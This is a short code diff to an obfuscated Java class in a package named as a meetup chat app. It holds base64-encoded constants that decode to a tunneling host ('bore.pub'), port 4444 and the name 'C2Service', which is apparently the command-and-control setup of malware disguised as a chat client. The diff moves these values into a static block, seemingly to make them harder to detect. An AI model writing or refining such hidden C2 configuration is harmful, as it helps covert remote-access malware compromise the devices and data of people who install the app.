@@ -1,7 +1,13 @@
 package com.meetup.chat;
 
 public class c {
-    public static final String a = b.a("b3JlLnB1Yg==");   // bore.pub
-    public static final int b = 4444;
-    public static final String c = b.a("QzJTZXJ2aWNl");   // C2Service
+    // Initialize with dummy values then set in static block
+    public static String a;
+    public static int b = 4444;
+    public static String c;
+    
+    static {
+        a = b.a("b3JlLnB1Yg==");   // bore.pub
+        c = b.a("QzJTZXJ2aWNl");   // C2Service
+    }
 }
